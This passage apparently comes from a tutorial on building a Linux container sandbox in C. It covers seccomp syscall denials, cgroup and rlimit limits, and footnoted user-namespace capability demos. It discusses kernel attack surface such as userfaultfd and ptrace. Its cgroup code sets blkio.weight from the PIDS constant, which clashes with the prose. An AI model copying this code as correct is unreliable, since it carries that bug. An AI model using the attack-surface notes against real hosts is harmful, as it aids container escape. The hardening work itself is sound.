	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)

```

Before Linux 4.8, `ptrace` totally breaks seccomp[51](#fn.51).

Listing 127: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ptrace), 0)

```

These system calls let processes assign NUMA nodes. I don't have
anything specific in mind, but I could see these being used to deny
service to some other NUMA-aware application on the host.

Listing 128: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(mbind), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(migrate_pages), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(move_pages), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(set_mempolicy), 0)

```

`userfaultd` allows userspace to handle page
faults[52](#fn.52). It doesn't require any privileges, so in
theory it should be safe to be called by an unprivileged user. But it
can be used to pause execution in the kernel by triggering page faults
in system calls. This is an important part in some kernel
exploits[53](#fn.53). It's only rarely used legitimately, so
I'll disable it.

Listing 130: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(userfaultfd), 0)

```

I was initially worried about `perf_event_open` because the [Docker
documentation says](https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md) it "could leak a lot of information on the host",
but it can't be used in our system to see information for
out-of-namespace processes[54](#fn.54). But, if
`/proc/sys/kernel/perf_event_paranoid` is less than 2, it can be used
to discover kernel addresses and possibly uninitialized memory. 2 is
the default since is the default since 4.6, but it can be changed, and
relying on it seems like a bad idea[55](#fn.55).

Listing 135: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(perf_event_open), 0)

```

We'll set `PR_SET_NO_NEW_PRIVS` to 0. The name is a little vague: it
specifically prevents `setuid` and `setcap`'d binaries from being
executed with their additional privileges. This has some security
benefits (it makes it harder for an unprivileged user in-container to
exploit a vulnerability in a setuid or setcap executable to become
in-container root, for example). But it's a little weird, and means
that, for example, `ping` won't work in a container for an
unprivileged user[56](#fn.56).

Listing 140: `<<syscalls>>` +=
```
	    || seccomp_attr_set(ctx, SCMP_FLTATR_CTL_NNP, 0)

```

And we'll actually apply it to the process, and release the context.

Listing 141: `<<syscalls>>` +=
```
	    || seccomp_load(ctx)) {
		if (ctx) seccomp_release(ctx);
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	seccomp_release(ctx);
	fprintf(stderr, "done.\n");
	return 0;
}

```

#### Allowed System Calls

Here are the system calls that are disallowed by the default Docker
policy but permitted by this code:

`_sysctl` is obsolete and disabled by
default[57](#fn.57). `alloc_hugepages` and
`free_hugepages` [58](#fn.58), `bdflush` [59](#fn.59),
`create_module` [60](#fn.60), `nfsservctl` [61](#fn.61),
`perfctr` [62](#fn.62), `get_kernel_syms` [63](#fn.63), and
`setup` [64](#fn.64) are not present on modern Linux.

`clock_adjtime`, `clock_settime` [65](#fn.65), and
`adjtime` [66](#fn.66) depend on `CAP_SYS_TIME`.

`pciconfig_read` and `pciconfig_write` [67](#fn.67) and all of the
side-effecting operations of `quotactl` [68](#fn.68) are prevented by
`CAP_SYS_ADMIN`.

`get_mempolicy` and `getpagesize` reveal information about the memory
layout of the system, but they can be made by unprivileged processes,
and are probably harmless. `pciconfig_iobase` can be made by
unprivileged processes, and reveals information about PCI decvices.
`ustat` [69](#fn.69) and `sysfs` [70](#fn.70) leak some information about
the filesystems, but are nothing that I see as critical. `uselib` is
more-or-less obsolete, but is just used for loading a shared library
in userspace [71](#fn.71)

`sync_file_range2` is `sync_file_range` with swapped argument
order[72](#fn.72).

`readdir` is mostly obsolete, but probably harmless[73](#fn.73).

`kexec_file_load` and `kexec_load` are prevented by
`CAP_SYS_BOOT` [74](#fn.74).

`nice` can only be used to lower priority without
`CAP_SYS_NICE` [75](#fn.75).

`oldfstat`, `oldlstat`, `oldolduname`, `oldstat`, and `olduname` are
just older versions of their respective functions. I expect them to
have the same security properties as the modern ones.

`perfmonctl` [76](#fn.76) is only available on
IA-64. `ppc_rtas` [77](#fn.77), `spu_create` [78](#fn.78) and
`spu_run` [79](#fn.79), and `subpage_prot` [80](#fn.80) are only
avaiable on PowerPC. `utrap_install` is only available on
Sparc[81](#fn.81). `kern_features` is only available on
Sparc64, and should be harmless anyway[82](#fn.82).

I don't believe `pivot_root` is a problem in our setup (but it could
probably be used to circumvent path-based MAC).

`preadv2` and `pwritev2` are just extensions to `preadv` and `pwritev`
/ `readv` and `writev`, which are "scatter input" / "gather output"
extensions to `read` and `write` [83](#fn.83).

### Resources

We'd like to prevent badly-behaved child processes from denying
service to the rest of the system[84](#fn.84). Cgroups let
us limit memory and cpu time in particular; limiting the pid count and
IO usage is also useful. [There's a very useful document in the kernel
tree about it](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt).

The `cgroup` and `cgroup2` filesystems are the canonical interfaces to
the cgroup system. `cgroup2` is a little different, and unitialized
on my system, so I'll use the first version here.

Cgroup namespaces are a little different from, for example, mount
namespaces. We need to create the cgroup before we enter a cgroup
namespace; once we do, that cgroup will behave like the root cgroup
inside of the namespace[85](#fn.85). This isn't the most
relevant, since a contained process can't mount the cgroup filesystem
or `/proc` for introspection, but it's nice to be thorough.

I'll set up a struct so I don't have to repeat myself too much, with
the following instructions:

* Set `memory/$hostname/memory.limit_in_bytes`, so the contained
  process and its child processes can't total more than 1GB memory in
  userspace[86](#fn.86).
* Set `memory/$hostname/memory.kmem.limit_in_bytes`, so that the
  contained process and its child processes can't total more than 1GB
  memory in userspace[87](#fn.87).
* Set `cpu/$hostname/cpu.shares` to 256. CPU shares are chunks of
  1024; 256 \* 4 = 1024, so this lets the contained process take a
  quarter of cpu-time on a busy system at most[88](#fn.88).
* Set the `pids/$hostname/pid.max`, allowing the contained process and
  its children to have 64 pids at most. This is useful because there
  are per-user pid limits that we could hit on the host if the
  contained process occupies too many[89](#fn.89).
* Set `blkio/$hostname/weight` to 50, so that it's lower than the rest
  of the system and prioritized accordingly[90](#fn.90).

I'll also add the calling process for each of
`{memory,cpu,blkio,pids}/$hostname/tasks` by writing '0' to it.

Listing 181: `<<resources>>` +=
```
#define MEMORY "1073741824"
#define SHARES "256"
#define PIDS "64"
#define WEIGHT "10"
#define FD_COUNT 64

struct cgrp_control {
	char control[256];
	struct cgrp_setting {
		char name[256];
		char value[256];
	} **settings;
};
struct cgrp_setting add_to_tasks = {
	.name = "tasks",
	.value = "0"
};

struct cgrp_control *cgrps[] = {
	& (struct cgrp_control) {
		.control = "memory",
		.settings = (struct cgrp_setting *[]) {
			& (struct cgrp_setting) {
				.name = "memory.limit_in_bytes",
				.value = MEMORY
			},
			& (struct cgrp_setting) {
				.name = "memory.kmem.limit_in_bytes",
				.value = MEMORY
			},
			&add_to_tasks,
			NULL
		}
	},
	& (struct cgrp_control) {
		.control = "cpu",
		.settings = (struct cgrp_setting *[]) {
			& (struct cgrp_setting) {
				.name = "cpu.shares",
				.value = SHARES
			},
			&add_to_tasks,
			NULL
		}
	},
	& (struct cgrp_control) {
		.control = "pids",
		.settings = (struct cgrp_setting *[]) {
			& (struct cgrp_setting) {
				.name = "pids.max",
				.value = PIDS
			},
			&add_to_tasks,
			NULL
		}
	},
	& (struct cgrp_control) {
		.control = "blkio",
		.settings = (struct cgrp_setting *[]) {
			& (struct cgrp_setting) {
				.name = "blkio.weight",
				.value = PIDS
			},
			&add_to_tasks,
			NULL
		}
	},
	NULL
};

```

Writing to the cgroups version 1 filesystem works like
this[91](#fn.91):

* In each controller, you can create a cgroup with a name with
  `mkdir`. For memory, `mkdir /sys/fs/cgroup/memory/$hostname`.
* Inside of that you can write to the individual files to set
  values. For example, `echo $MEMORY >
  /sys/fs/cgroup/memory/$hostname/memory.limit_in_bytes`.
* You can a pid to `tasks` to add the process tree to the cgroup. "0"
  is a special value that means "the writing process".

so I'll iterate over that structure and fill in the values.

Listing 183: `<<resources>>` +=
```
int resources(struct child_config *config)
{
	fprintf(stderr, "=> setting cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		fprintf(stderr, "%s...", (*cgrp)->control);
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)->control, config->hostname) == -1) {
			return -1;
		}
		if (mkdir(dir, S_IRUSR | S_IWUSR | S_IXUSR)) {
			fprintf(stderr, "mkdir %s failed: %m\n", dir);
			return -1;
		}
		for (struct cgrp_setting **setting = (*cgrp)->settings; *setting; setting++) {
			char path[PATH_MAX] = {0};
			int fd = 0;
			if (snprintf(path, sizeof(path), "%s/%s", dir,
				     (*setting)->name) == -1) {
				fprintf(stderr, "snprintf failed: %m\n");
				return -1;
			}
			if ((fd = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "opening %s failed: %m\n", path);
				return -1;
			}
			if (write(fd, (*setting)->value, strlen((*setting)->value)) == -1) {
				fprintf(stderr, "writing to %s failed: %m\n", path);
				close(fd);
				return -1;
			}
			close(fd);
		}
	}
	fprintf(stderr, "done.\n");

```

I'll also lower the hard limit on the number of file descriptors. The
file descriptor number, like the number of pids, is per-user, and so
we want to prevent in-container process from occupying all of
them. Setting the hard limit sets a permanent upper bound for this
process tree, since I've dropped
`CAP_SYS_RESOURCE` [92](#fn.92).

Listing 185: `<<resources>>` +=
```
	fprintf(stderr, "=> setting rlimit...");
	if (setrlimit(RLIMIT_NOFILE,
		      & (struct rlimit) {
			.rlim_max = FD_COUNT,
			.rlim_cur = FD_COUNT,
		})) {
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}

```

We'd also like to clean up the cgroup for this hostname. There's
built-in functionality for this, but we would need to change
system-wide values to do it cleanly[93](#fn.93). Since we
have the `contained` process waiting on the contained process, it's
simple to do it this way. First we move the `contained` process back
into the root `tasks`; then, since the child process is finished, and
leaving the pid namespace `SIGKILLS` its children, the `tasks` is
empty. We can safely `rmdir` at this point.

Listing 187: `<<resources>>` +=
```

int free_resources(struct child_config *config)
{
	fprintf(stderr, "=> cleaning cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		char task[PATH_MAX] = {0};
		int task_fd = 0;
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)->control, config->hostname) == -1
		    || snprintf(task, sizeof(task), "/sys/fs/cgroup/%s/tasks",
				(*cgrp)->control) == -1) {
			fprintf(stderr, "snprintf failed: %m\n");
			return -1;
		}
		if ((task_fd = open(task, O_WRONLY)) == -1) {
			fprintf(stderr, "opening %s failed: %m\n", task);
			return -1;
		}
		if (write(task_fd, "0", 2) == -1) {
			fprintf(stderr, "writing to %s failed: %m\n", task);
			close(task_fd);
			return -1;
		}
		close(task_fd);
		if (rmdir(dir)) {
			fprintf(stderr, "rmdir %s failed: %m", dir);
			return -1;
		}
	}
	fprintf(stderr, "done.\n");
	return 0;
}

```

### Networking

Container networking takes a little too much explanation for this
space. It usually works like this:

* Create a bridge device.
* Create a virtual ethernet pair and attach one end to the bridge.
* Put the other end in the network namespace.
* For outside networking access, the host needs to be set to forward
  (and possibly NAT) packets.

Having multiple contained processes sharing a bridge device would mean
they're both on the same LAN from the host's perspective. So ARP
spoofing is a recurring issue with containers that work this
way[94](#fn.94).

The canonical way to do this from C is the `rtnetlink` interface; it
would probably be easier to use `ip link ...`.

We could also limit the network usage with the `net_prio` cgroup
controller[95](#fn.95).

## Footnotes:

[1](#fnr.1)

["Linux User Namespaces Might Not Be Secure Enough"](https://medium.com/%40ewindisch/linux-user-namespaces-might-not-be-secure-enough-a-k-a-subverting-posix-capabilities-f1c4ae19cad#.3lbw4loa7) by Erica Windisch:

> If a (real) root user has had the SYS\_CAP\_ADMIN capability
> removed, but then creates a user namespace, this capability is
> restored for the (fake) root user. That is, before creating the
> namespace, âmountâ would be denied, but following the creation of
> the user namespace, the âmountâ syscall would magically work
> again, albeit in a limited fashion. While limited in function,
> itâs significant enough that given a (real) root user and a kernel
> with user namespaces, Linux capabilities may be completely
> subverted.

and [`man 7 user_namespaces`](http://man7.org/linux/man-pages/man7/user_namespaces.7.html) says:

> The child process created by clone(2) with the CLONE\_NEWUSER
> flag starts out with a complete set of capabilities in the new
> user namespace.

and ["Understanding and Hardening Linux Containers"](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf) again

> User namespaces also allows for ``interesting'' intersections of
> security models, whereas full root capabilities are granted to new
> namespace. This can allow CLONE\_NEWUSER to effectively use
> CAP\_NET\_ADMIN over other network namespaces as they are exposed,
> and if containers are not in use. Additionally, as we have seen many
> times, processes with CAP\_NET\_ADMIN have a large attack surface and
> have resulted in a number of different kernel vulnerabilities. This
> may allow an unprivileged user namespace to target a large attack
> surface (the kernel networking subsystem) whereas a privileged
> container with reduced capabilities would not have such
> permissions. See Section 5.5 on page 39 for a more in-depth discussion
> on this topic.

We can demonstrate this behavior (on a host with user namespaces
compiled in) with

Listing 1: `subverting_networking.c`
```
/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -static  subverting_networking.c \*/
/*                   -o subverting_networking" */
/* End: */
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/sockios.h>

int main (int argc, char **argv)
{
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
		fprintf(stderr, "++ unshare failed: %m\n");
		return 1;
	}
	/* this is how you create a bridge... */
	int sock = 0;
	if ((sock = socket(PF_LOCAL, SOCK_STREAM, 0)) == -1) {
		fprintf(stderr, "++ socket failed: %m\n");
		return 1;
	}
	if (ioctl(sock, SIOCBRADDBR, "br0")) {
		fprintf(stderr, "++ ioctl failed: %m\n");
		close(sock);
		return 1;
	}
	close(sock);
	fprintf(stderr, "++ success!\n");
	return 0;
}

```
```

  alpine-kernel-dev:~$ whoami
  lizzie
  alpine-kernel-dev:~$ ./subverting_networking
  ++ success!
  alpine-kernel-dev:~$

```

but we're not actually that powerful.

Listing 2: `subverting_setfcap.c`
```
/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -lcap -static subverting_setfcap.c \*/
/*                   -o subverting_setfcap" */
/* End: */
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <linux/capability.h>
#include <sys/capability.h>

int main (int argc, char **argv)
{
	if (unshare(CLONE_NEWUSER)) {
		fprintf(stderr, "++ unshare failed: %m\n");
		return 1;
	}
	cap_t cap = cap_from_text("cap_net_admin+ep");
	if (cap_set_file("example", cap)) {
		fprintf(stderr, "++ cap_set_file failed: %m\n");
		cap_free(cap);
		return 1;
	}
	cap_free(cap);
	return 0;
}

```
```

  alpine-kernel-dev:~$ whoami
  lizzie
  alpine-kernel-dev:~$ touch example
  alpine-kernel-dev:~$ ./subverting_setfcap
  ++ cap_set_file failed: Operation not permitted

```

[2](#fnr.2)

[`init/Kconfig:1207@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/init/Kconfig?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1207)

```
config USER_NS
	bool "User namespace"
	default n
	help
	  This allows containers, i.e. vservers, to use user namespaces
	  to provide different user info for different servers.

	  When user namespaces are enabled in the kernel it is
	  recommended that the MEMCG option also be enabled and that
	  user-space use the memory control groups to limit the amount
	  of memory a memory unprivileged users can use.

	  If unsure, say N.

```

[3](#fnr.3)

Ubuntu switches `CONFIG_USER_NS` on, but patches it so that it
unprivileged use can be disabled with a sysctl,
`unpriviliged_userns_clone`.

Listing 3: [`92e575e769cc50a9bfb50fb58fe94aab4f2a2bff`](http://kernel.ubuntu.com/git/ubuntu/ubuntu-xenial.git/commit/?id%3D92e575e769cc50a9bfb50fb58fe94aab4f2a2bff)
```
commit 92e575e769cc50a9bfb50fb58fe94aab4f2a2bff
Author: Serge Hallyn <redacted>
Date:   Tue Jan 5 20:12:21 2016 +0000

    UBUNTU: SAUCE: add a sysctl to disable unprivileged user namespace unsharing

    It is turned on by default, but can be turned off if admins prefer or,
    more importantly, if a security vulnerability is found.

    The intent is to use this as mitigation so long as Ubuntu is on the
    cutting edge of enablement for things like unprivileged filesystem
    mounting.

    (This patch is tweaked from the one currently still in Debian sid, which
    in turn came from the patch we had in saucy)

    Signed-off-by: Serge Hallyn <redacted>
    [bwh: Remove unneeded binary sysctl bits]
    Signed-off-by: Tim Gardner <redacted>

```

Debian has the same behavior:

Listing 4: [`debian/patches/debian/add-sysctl-to-allow-unprivileged-CLONE_NEWUSER-by-default.patch`](https://anonscm.debian.org/git/kernel/linux.git/tree/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch)
```
From: Serge Hallyn <redacted>
Date: Fri, 31 May 2013 19:12:12 +0000 (+0100)
Subject: add sysctl to disallow unprivileged CLONE_NEWUSER by default
Origin: http://kernel.ubuntu.com/git?p=serge%2Fubuntu-saucy.git;a=commit;h=5c847404dcb2e3195ad0057877e1422ae90892b8

add sysctl to disallow unprivileged CLONE_NEWUSER by default

This is a short-term patch.  Unprivileged use of CLONE_NEWUSER
is certainly an intended feature of user namespaces.  However
for at least saucy we want to make sure that, if any security
issues are found, we have a fail-safe.

Signed-off-by: Serge Hallyn <redacted>
[bwh: Remove unneeded binary sysctl bits]
---

```

Grsecurity disables it entirely for users without `CAP_SYS_ADMIN`,
`CAP_SETUID`, and `CAP_SETGID`.

Listing 5: <https://grsecurity.net/test/grsecurity-3.1-4.7.9-201610200819.patch>
```
--- a/kernel/user_namespace.c
+++ b/kernel/user_namespace.c
@@ -84,6 +84,21 @@ int create_user_ns(struct cred *new)
 	    !kgid_has_mapping(parent_ns, group))
 		return -EPERM;

+#ifdef CONFIG_GRKERNSEC
+	/*
+	 * This doesn't really inspire confidence:
+	 * http://marc.info/?l=linux-kernel&m=135543612731939&w=2
+	 * http://marc.info/?l=linux-kernel&m=135545831607095&w=2
+	 * Increases kernel attack surface in areas developers
+	 * previously cared little about ("low importance due
+	 * to requiring "root" capability")
+	 * To be removed when this code receives *proper* review
+	 */
+	if (!capable(CAP_SYS_ADMIN) || !capable(CAP_SETUID) ||
+			!capable(CAP_SETGID))
+		return -EPERM;
+#endif

```

and Arch Linux has it off.

Listing 6: [{linux} 3.13 add CONFIG\_USER\_NS](https://bugs.archlinux.org/task/36969)
```
Comment by William Kennington (Webhostbudd) - Sunday, 06 October 2013, 03:55 GMT

I agree with Florian, allowing non-root users to take advantage of
elevating themselves to a local root seems like a huge attack
surface. Preferably this would be a sysctl with a huge warning
attached to it when it is switched on.

Comment by Daniel Micay (thestinger) - Monday, 24 November 2014, 03:55 GMT

[...]  Arch doesn't add new features via patches. If you want to see
this feature enabled, then land something like this upstream. Note
that CONFIG_USER_NS is already enabled in the linux-grsec package
because it fully removes the ability to have unprivileged user
namespaces.

```

It would have been cool to include Red Hat's patches here, but I
couldn't find them.

[4](#fnr.4)

Most of this section is cribbed from the example at the bottom of [`man 2 clone`](http://man7.org/linux/man-pages/man2/clone.2.html).

[5](#fnr.5)
Listing 11: `clone_stack.c`
```
/* -*- compile-command: "gcc -Wall -Werror clone_stack.c -o clone_stack" -*- */
#define _GNU_SOURCE
#include <sched.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define STACK_SIZE (1024 * 1024)

int child (void *_)
{
	int stack_value = 0;
	fprintf(stderr, "pre-execve, stack is ~%p\n", &stack_value);
	execve("./show_stack", (char  *[]) {",/show_stack", 0}, NULL);
	return 0;
}

int main (int argc, char **argv) {
	void *stack = malloc(STACK_SIZE);
	clone(child, stack + STACK_SIZE, SIGCHLD, NULL);
	wait(NULL);
	return 0;
}

```

Listing 12: `show_stack.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static show_stack.c -o show_stack" -*- */
#include <stdio.h>

int main (int argc, char **argv)
{
	int stack_value = 0;
	fprintf(stderr, "post-execve, stack is ~%p\n", &stack_value);
	return 0;
}

```
```

  [lizzie@empress linux-containers-in-500-loc]$ ./clone_stack
  pre-execve, stack is ~0x7f3f98deefec
  post-execve, stack is ~0x7ffd14d2291c

```

The stack grows down on x86, so the fact that the address is higher
numerically post-execve means that a new stack has been allocated.

[6](#fnr.6)

I thought this might be undefined behavior,
since `stack + STACK_SIZE` does point past the last item of the array,
but point 8 of 6.5.6 [Additive operators] in [ISO-9899](http://www.iso-9899.info/n1570.html) has us covered:

> If both the pointer
> operand and the result point to elements of the same array object, or one past the last
> element of the array object, the evaluation shall not produce an overflow; otherwise, the
> behavior is undefined. If the result points one past the last element of the array object, it
> shall not be used as the operand of a unary \* operator that is evaluated.

i.e., the pointer addition is valid, but dereferencing it wouldn't be.

[7](#fnr.7)

I wasn't confident that `waitpid` was enough to wait for the process
and all of its children, but when the root of a pid namespace closes,
all of its children get `SIGKILL`:

[`man 7 pid_namespaces`](http://man7.org/linux/man-pages/man7/pid_namespaces.7.html):

> If the "init" process of a PID namespace terminates, the
> kernel terminates all of the processes in the namespace via
> a SIGKILL signal. This behavior reflects the fact that the
> "init" process is essential for the correct operation of a
> PID namespace.

Also verified this myself, before I found that:

Listing 18: `persistent_child.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static persistent_child.c -o persistent_child" -*- */
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main (int argc, char **argv)
{
	switch (fork()) {
	case -1:
		fprintf(stderr, "++ fork failed: %m\n");
		return 1;
	case 0:;
		int fd = 0;
		if ((fd = open("persistent_child.log",
			       O_CREAT | O_APPEND | O_WRONLY,
			       S_IRUSR | S_IWUSR)) == -1) {
			fprintf(stderr, "++ open failed: %m\n");
			return 1;
		}
		size_t count = 0;
		while (count < 100) {
			if (dprintf(fd, "%lu\n", count++) < 0) {
				fprintf(stderr, "++ dprintf failed: %m\n");
				close(fd);
				return 1;
			}
			sleep(1);
		}
		close(fd);
		return 0;
	default:
		sleep(2);
		return 0;
	}
}

```
```

[lizzie@empress l-c-i-500-l]$ touch persistent_child.log
[lizzie@empress l-c-i-500-l]$ chmod 666 persistent_child.log
[lizzie@empress l-c-i-500-l]$ sudo strace -f ./contained -m . -u 0 -c ./persistent_child
execve("./contained", ["./contained", "-m", ".", "-u", "0", "-c", "./persistent_child"], [/* 15 vars */]) = 0
brk(NULL)                               = 0x605490
# ...
[pid   736] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x6b68d0) = 2
strace: Process 746 attached
[pid   736] nanosleep({2, 0},  <unfinished ...>
[pid   746] open("persistent_child.log", O_WRONLY|O_CREAT|O_APPEND, 0600) = 3
[pid   746] fstat(3, {st_mode=S_IFREG|0666, st_size=4, ...}) = 0
[pid   746] lseek(3, 0, SEEK_CUR)       = 0
[pid   746] write(3, "0\n", 2)          = 2
[pid   746] nanosleep({1, 0}, 0x3fee2d718d0) = 0
[pid   746] fstat(3, {st_mode=S_IFREG|0666, st_size=6, ...}) = 0
[pid   746] lseek(3, 0, SEEK_CUR)       = 6
[pid   746] write(3, "1\n", 2)          = 2
[pid   746] nanosleep({1, 0},  <unfinished ...>
[pid   736] <... nanosleep resumed> 0x3fee2d718d0) = 0
[pid   736] exit_group(0)               = ?
[pid   746] +++ killed by SIGKILL +++
[pid   736] +++ exited with 0 +++
# ...

```
Listing 19: `<<namespaces>>` +=
```
	close(sockets[1]);
	sockets[1] = 0;
	if (handle_child_uid_map(child_pid, sockets[0])) {
		err = 1;
		goto kill_and_finish_child;
	}

	goto finish_child;
kill_and_finish_child:
	if (child_pid) kill(child_pid, SIGKILL);
finish_child:;
	int child_status = 0;
	waitpid(child_pid, &child_status, 0);
	err |= WEXITSTATUS(child_status);
clear_resources:
	free_resources(&config);
	free(stack);

```

A process setting its own user namespace is pretty
limited[8](#fn.8), so the parent will wait until the
child enters the user namespace, and then write a mapping to its
`uid_map` and `gid_map`.

[8](#fnr.8)
Listing 20: [`man 7 user_namespaces`](http://man7.org/linux/man-pages/man7/user_namespaces.7.html)
```
	In order for  a process to write  to the /proc/[pid]/uid_map
	(/proc/[pid]/gid_map)   file,    all   of    the   following
	requirements must be met:

	1. The writing process must have the CAP_SETUID (CAP_SETGID)
	   capability in the user namespace of the process pid.

	2. The writing process must either  be in the user namespace
	   of the process pid or be  in the parent user namespace of
	   the process pid.

	3. The  mapped user  IDs (group  IDs)  must in  turn have  a
	   mapping in the parent user namespace.

	4. One of the following two cases applies:

	   *  Either   the  writing   process  has   the  CAP_SETUID
		 (CAP_SETGID) capability in the parent user namespace.

		 +  No further restrictions apply: the process can make
		    mappings to  arbitrary user IDs (group  IDs) in the
		    parent user namespace.

	   *  Or otherwise all of the following restrictions apply:

		 +  The data written to  uid_map (gid_map) must consist
		    of a  single line  that maps the  writing process's
		    effective  user ID  (group ID)  in the  parent user
		    namespace  to a  user  ID (group  ID)  in the  user
		    namespace.

		 +  The writing  process must  have the  same effective
		    user  ID  as  the  process that  created  the  user
		    namespace.

		 +  In  the case  of gid_map,  use of  the setgroups(2)
		    system call must first be denied by writing deny to
		    the /proc/[pid]/setgroups  file (see  below) before
		    writing to gid_map.

	Writes  that violate  the above  rules fail  with the  error
	EPERM.

```

[9](#fnr.9)

`gid`, `sgid`, and `egid` are separate from `group_info` in `struct cred`:

Listing 22: [`include/linux/cred.h:95@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/include/linux/cred.h?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n95)
```
/*
 * The security context of a task
 *
 * The parts of the context break down into two categories:
 *
 *  (1) The objective context of a task.  These parts are used when some other
 *	task is attempting to affect this one.
 *
 *  (2) The subjective context.  These details are used when the task is acting
 *	upon another object, be that a file, a task, a key or whatever.
 *
 * Note that some members of this structure belong to both categories - the
 * LSM security pointer for instance.
 *
 * A task has two security pointers.  task->real_cred points to the objective
 * context that defines that task's actual details.  The objective part of this
 * context is used whenever that task is acted upon.
 *
 * task->cred points to the subjective context that defines the details of how
 * that task is going to act upon another object.  This may be overridden
 * temporarily to point to another security context, but normally points to the
 * same context as task->real_cred.
 */
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};

```

[10](#fnr.10)

For example, `test_perm` in the `/proc/sys`-handling-code:

Listing 25: [`fs/proc/proc_sysctl.c:406@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/proc/proc_sysctl.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n406)
```
static int test_perm(int mode, int op)
{
	if (uid_eq(current_euid(), GLOBAL_ROOT_UID))
		mode >>= 6;
	else if (in_egroup_p(GLOBAL_ROOT_GID))
		mode >>= 3;
	if ((op & ~mode & (MAY_READ|MAY_WRITE|MAY_EXEC)) == 0)
		return 0;
	return -EACCES;
}

```

[11](#fnr.11)
Listing 26: `try_regain_cap.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static try_regain_cap.c -o try_regain_cap" -*- */
#include <linux/capability.h>
#include <sys/prctl.h>
#include <stdio.h>

int main (int argc, char  **argv)
{
	if (prctl(PR_CAPBSET_READ, CAP_MKNOD, 0, 0, 0)) {
 		fprintf(stderr, "++ have CAP_MKNOD\n");
	} else {
		fprintf(stderr, "++ don't have CAP_MKNOD\n");
	}
	return 0;
}

```

If we drop the bounding set, files with extra capabilities don't get those capabilities:

```

[lizzie@empress l-c-i-500-l]$ sudo setcap "cap_mknod+p" try_regain_cap
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c try_regain_cap
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.lVLNB1...done.
